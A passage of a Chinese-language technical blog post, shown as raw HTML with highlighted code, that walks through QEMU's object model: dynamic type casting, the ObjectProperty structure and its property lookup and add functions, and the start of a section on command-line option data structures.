class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">Object *<span class="title function_">object_dynamic_cast_assert</span><span class="params">(Object *obj, <span class="type">const</span> <span class="type">char</span> *typename,</span></span><br><span class="line"><span class="params">                                   <span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line, <span class="type">const</span> <span class="type">char</span> *func)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_QOM_CAST_DEBUG</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    Object *inst;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; obj &amp;&amp; i &lt; OBJECT_CLASS_CAST_CACHE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (qatomic_read(&amp;obj-&gt;class-&gt;object_cast_cache[i]) == typename) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    inst = object_dynamic_cast(obj, typename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!inst &amp;&amp; obj) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s:%d:%s: Object %p is not an instance of type %s\n&quot;</span>,</span><br><span class="line">                file, line, func, obj, typename);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(obj == inst);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj &amp;&amp; obj == inst) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; OBJECT_CLASS_CAST_CACHE; i++) &#123;</span><br><span class="line">            qatomic_set(&amp;obj-&gt;class-&gt;object_cast_cache[i - <span class="number">1</span>],</span><br><span class="line">                       qatomic_read(&amp;obj-&gt;class-&gt;object_cast_cache[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        qatomic_set(&amp;obj-&gt;class-&gt;object_cast_cache[i - <span class="number">1</span>], typename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Object *<span class="title function_">object_dynamic_cast</span><span class="params">(Object *obj, <span class="type">const</span> <span class="type">char</span> *typename)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj &amp;&amp; object_class_dynamic_cast(object_get_class(obj), typename)) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectClass *<span class="title function_">object_class_dynamic_cast</span><span class="params">(ObjectClass *class,</span></span><br><span class="line"><span class="params">                                       <span class="type">const</span> <span class="type">char</span> *typename)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectClass *ret = <span class="literal">NULL</span>;</span><br><span class="line">    TypeImpl *target_type;</span><br><span class="line">    TypeImpl *type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A simple fast path that can trigger a lot for leaf classes.  */</span></span><br><span class="line">    type = class-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> (type-&gt;name == typename) &#123;</span><br><span class="line">        <span class="keyword">return</span> class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target_type = type_get_by_name(typename);</span><br><span class="line">    <span class="keyword">if</span> (!target_type) &#123;</span><br><span class="line">        <span class="comment">/* target class type unknown, so fail the cast */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (type_is_ancestor(type, target_type)) &#123;</span><br><span class="line">        ret = class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">type_is_ancestor</span><span class="params">(TypeImpl *type, TypeImpl *target_type)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(target_type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if target_type is a direct ancestor of type */</span></span><br><span class="line">    <span class="keyword">while</span> (type) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == target_type) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        type = type_get_parent(type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectClass *<span class="title function_">object_class_dynamic_cast_assert</span><span class="params">(ObjectClass *class,</span></span><br><span class="line"><span class="params">                                              <span class="type">const</span> <span class="type">char</span> *typename,</span></span><br><span class="line"><span class="params">                                              <span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line,</span></span><br><span class="line"><span class="params">                                              <span class="type">const</span> <span class="type">char</span> *func)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectClass *ret;</span><br><span class="line"></span><br><span class="line">    trace_object_class_dynamic_cast_assert(class ? class-&gt;type-&gt;name : <span class="string">&quot;(null)&quot;</span>,</span><br><span class="line">                                           typename, file, line, func);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_QOM_CAST_DEBUG</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; class &amp;&amp; i &lt; OBJECT_CLASS_CAST_CACHE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (qatomic_read(&amp;class-&gt;class_cast_cache[i]) == typename) &#123;</span><br><span class="line">            ret = class;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="keyword">if</span> (!class || !class-&gt;interfaces) &#123;</span><br><span class="line">        <span class="keyword">return</span> class;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    ret = object_class_dynamic_cast(class, typename);</span><br><span class="line">    <span class="keyword">if</span> (!ret &amp;&amp; class) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s:%d:%s: Object %p is not an instance of type %s\n&quot;</span>,</span><br><span class="line">                file, line, func, class, typename);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_QOM_CAST_DEBUG</span></span><br><span class="line">    <span class="keyword">if</span> (class &amp;&amp; ret == class) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; OBJECT_CLASS_CAST_CACHE; i++) &#123;</span><br><span class="line">            qatomic_set(&amp;class-&gt;class_cast_cache[i - <span class="number">1</span>],</span><br><span class="line">                       qatomic_read(&amp;class-&gt;class_cast_cache[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        qatomic_set(&amp;class-&gt;class_cast_cache[i - <span class="number">1</span>], typename);</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>类似于linux中的sysfs，考虑到<strong>QOM</strong>的每个类的<strong>Class</strong>结构体基类是<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qom/object.h#L127"><strong>struct ObjectClass</strong></a>，每个对象的<strong>Object</strong>结构体基类是<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qom/object.h#L153"><strong>Object</strong></a>，为了提供一套类和对象的公用对外接口，<strong>QOM</strong>为<strong>struct ObjectClass</strong>和<strong>struct Object</strong>添加了<strong>properties</strong>域，即属性名称到<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qom/object.h#L88"><strong>struct ObjectProperty</strong></a>的哈希表，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *type;</span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *<span class="built_in">set</span>;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    ObjectPropertyInit *init;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QObject *defval;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * typedef ObjectPropertyAccessor:</span></span><br><span class="line"><span class="comment"> * @obj: the object that owns the property</span></span><br><span class="line"><span class="comment"> * @v: the visitor that contains the property data</span></span><br><span class="line"><span class="comment"> * @name: the name of the property</span></span><br><span class="line"><span class="comment"> * @opaque: the object property opaque</span></span><br><span class="line"><span class="comment"> * @errp: a pointer to an Error that is filled if getting/setting fails.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Called when trying to get/set a property.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(ObjectPropertyAccessor)</span><span class="params">(Object *obj,</span></span><br><span class="line"><span class="params">                                      Visitor *v,</span></span><br><span class="line"><span class="params">                                      <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                                      <span class="type">void</span> *opaque,</span></span><br><span class="line"><span class="params">                                      Error **errp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * typedef ObjectPropertyResolve:</span></span><br><span class="line"><span class="comment"> * @obj: the object that owns the property</span></span><br><span class="line"><span class="comment"> * @opaque: the opaque registered with the property</span></span><br><span class="line"><span class="comment"> * @part: the name of the property</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Resolves the #Object corresponding to property @part.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The returned object can also be used as a starting point</span></span><br><span class="line"><span class="comment"> * to resolve a relative path starting with &quot;@part&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns: If @path is the path that led to @obj, the function</span></span><br><span class="line"><span class="comment"> * returns the #Object corresponding to &quot;@path/@part&quot;.</span></span><br><span class="line"><span class="comment"> * If &quot;@path/@part&quot; is not a valid object path, it returns #NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> Object *(ObjectPropertyResolve)(Object *obj,</span><br><span class="line">                                        <span class="type">void</span> *opaque,</span><br><span class="line">                                        <span class="type">const</span> <span class="type">char</span> *part);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * typedef ObjectPropertyRelease:</span></span><br><span class="line"><span class="comment"> * @obj: the object that owns the property</span></span><br><span class="line"><span class="comment"> * @name: the name of the property</span></span><br><span class="line"><span class="comment"> * @opaque: the opaque registered with the property</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Called when a property is removed from a object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(ObjectPropertyRelease)</span><span class="params">(Object *obj,</span></span><br><span class="line"><span class="params">                                     <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                                     <span class="type">void</span> *opaque)</span>;</span><br></pre></td></tr></table></figure><br>其中，<code>name</code>表示属性的名称，<code>type</code>表示属性的类型，而<code>opaque</code>指向一个属性的具体类型的结构体信息，如下图所示<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌────────────────┐</span><br><span class="line">│                │</span><br><span class="line">│                │</span><br><span class="line">├────────────────┤</span><br><span class="line">│  properties    ├───────────────┬──────────────────────────────────────►</span><br><span class="line">├────────────────┤               │</span><br><span class="line">│                │               │</span><br><span class="line">│                │        ┌──────▼──────┐</span><br><span class="line">└────────────────┘        │    name     │</span><br><span class="line">struct ObjectClass        ├─────────────┤</span><br><span class="line">                          │    type     ├─────────►&quot;bool&quot;</span><br><span class="line">                          ├─────────────┤</span><br><span class="line">                          │    ...      │</span><br><span class="line">                          ├─────────────┤</span><br><span class="line">                          │    opaque   ├─────────►┌──────────┐</span><br><span class="line">                          └─────────────┘          │          │</span><br><span class="line">                       struct ObjectProperty       └──────────┘</span><br><span class="line">                                               struct BoolProperty</span><br></pre></td></tr></table></figure></p><p><strong>QOM</strong>分别使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L1399"><strong>object_class_property_find()</strong></a>、<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L1321"><strong>object_class_property_add()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L1348"><strong>object_property_find()</strong></a>、<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L1310"><strong>object_property_add()</strong></a>来查找和设置这些属性，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">ObjectProperty *<span class="title function_">object_class_property_find</span><span class="params">(ObjectClass *klass, <span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectClass *parent_klass;</span><br><span class="line"></span><br><span class="line">    parent_klass = object_class_get_parent(klass);</span><br><span class="line">    <span class="keyword">if</span> (parent_klass) &#123;</span><br><span class="line">        ObjectProperty *prop =</span><br><span class="line">            object_class_property_find(parent_klass, name);</span><br><span class="line">        <span class="keyword">if</span> (prop) &#123;</span><br><span class="line">            <span class="keyword">return</span> prop;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g_hash_table_lookup(klass-&gt;properties, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectProperty *</span><br><span class="line"><span class="title function_">object_class_property_add</span><span class="params">(ObjectClass *klass,</span></span><br><span class="line"><span class="params">                          <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                          <span class="type">const</span> <span class="type">char</span> *type,</span></span><br><span class="line"><span class="params">                          ObjectPropertyAccessor *get,</span></span><br><span class="line"><span class="params">                          ObjectPropertyAccessor *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">                          ObjectPropertyRelease *release,</span></span><br><span class="line"><span class="params">                          <span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectProperty *prop;</span><br><span class="line"></span><br><span class="line">    assert(!object_class_property_find(klass, name));</span><br><span class="line"></span><br><span class="line">    prop = g_malloc0(<span class="keyword">sizeof</span>(*prop));</span><br><span class="line"></span><br><span class="line">    prop-&gt;name = g_strdup(name);</span><br><span class="line">    prop-&gt;type = g_strdup(type);</span><br><span class="line"></span><br><span class="line">    prop-&gt;get = get;</span><br><span class="line">    prop-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line">    prop-&gt;release = release;</span><br><span class="line">    prop-&gt;opaque = opaque;</span><br><span class="line"></span><br><span class="line">    g_hash_table_insert(klass-&gt;properties, prop-&gt;name, prop);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> prop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectProperty *<span class="title function_">object_property_find</span><span class="params">(Object *obj, <span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectProperty *prop;</span><br><span class="line">    ObjectClass *klass = object_get_class(obj);</span><br><span class="line"></span><br><span class="line">    prop = object_class_property_find(klass, name);</span><br><span class="line">    <span class="keyword">if</span> (prop) &#123;</span><br><span class="line">        <span class="keyword">return</span> prop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g_hash_table_lookup(obj-&gt;properties, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">object_property_set</span><span class="params">(Object *obj, <span class="type">const</span> <span class="type">char</span> *name, Visitor *v,</span></span><br><span class="line"><span class="params">                         Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ERRP_GUARD();</span><br><span class="line">    ObjectProperty *prop = object_property_find_err(obj, name, errp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prop == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prop-&gt;<span class="built_in">set</span>) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Property &#x27;%s.%s&#x27; is not writable&quot;</span>,</span><br><span class="line">                   object_get_typename(obj), name);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    prop-&gt;<span class="built_in">set</span>(obj, v, name, prop-&gt;opaque, errp);</span><br><span class="line">    <span class="keyword">return</span> !*errp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectProperty *</span><br><span class="line"><span class="title function_">object_property_add</span><span class="params">(Object *obj, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">char</span> *type,</span></span><br><span class="line"><span class="params">                    ObjectPropertyAccessor *get,</span></span><br><span class="line"><span class="params">                    ObjectPropertyAccessor *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">                    ObjectPropertyRelease *release,</span></span><br><span class="line"><span class="params">                    <span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> object_property_try_add(obj, name, type, get, <span class="built_in">set</span>, release,</span><br><span class="line">                                   opaque, &amp;error_abort);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectProperty *</span><br><span class="line"><span class="title function_">object_property_try_add</span><span class="params">(Object *obj, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">char</span> *type,</span></span><br><span class="line"><span class="params">                        ObjectPropertyAccessor *get,</span></span><br><span class="line"><span class="params">                        ObjectPropertyAccessor *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">                        ObjectPropertyRelease *release,</span></span><br><span class="line"><span class="params">                        <span class="type">void</span> *opaque, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectProperty *prop;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (object_property_find(obj, name) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;attempt to add duplicate property &#x27;%s&#x27; to object (type &#x27;%s&#x27;)&quot;</span>,</span><br><span class="line">                   name, object_get_typename(obj));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prop = g_malloc0(<span class="keyword">sizeof</span>(*prop));</span><br><span class="line"></span><br><span class="line">    prop-&gt;name = g_strdup(name);</span><br><span class="line">    prop-&gt;type = g_strdup(type);</span><br><span class="line"></span><br><span class="line">    prop-&gt;get = get;</span><br><span class="line">    prop-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line">    prop-&gt;release = release;</span><br><span class="line">    prop-&gt;opaque = opaque;</span><br><span class="line"></span><br><span class="line">    g_hash_table_insert(obj-&gt;properties, prop-&gt;name, prop);</span><br><span class="line">    <span class="keyword">return</span> prop;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><p><strong>QEMU</strong>允许用户通过命令行参数来自定义虚拟机的设置，如<code>qemu-system-x86_64 -nic user,model=virtio-net-pci</code>，这里介绍一下<strong>QEMU</strong>的参数的相关机制。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p><strong>QEMU</strong>参数的数据结构整体关系如下所示<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">     ┌────┬─────────────┐</span><br><span class="line">     │name│&quot;nic&quot;        │</span><br><span class="line">     ├────┼─────────────┤</span><br><span class="line">     │head│             ├────┐</span><br><span class="line">     └────┴─────────────┘    │</span><br><span class="line">      struct QemuOptsList◄─┐ │</span><br><span class="line">                           │ │</span><br><span class="line">                           │ │</span><br><span class="line">     ┌────┬─────────────┐  │ │</span><br><span class="line">     │id  │             │  │ │</span><br><span class="line">     ├────┼─────────────┤  │ │</span><br><span class="line">     │list│             ├──┘ │</span><br><span class="line">     ├────┼─────────────┤    │</span><br><span class="line">     │next│             │◄───┘</span><br><span class="line">     ├────┼─────────────┤</span><br><span class="line">┌────┤head│             │</span><br><span class="line">│    └────┴─────────────┘</span><br><span class="line">│  ┌─► struct QemuOpts  ◄──────────┐</span><br><span class="line">│  │                               │</span><br><span class="line">│  │                               │</span><br><span class="line">│  │                               │</span><br><span class="line">│  │                     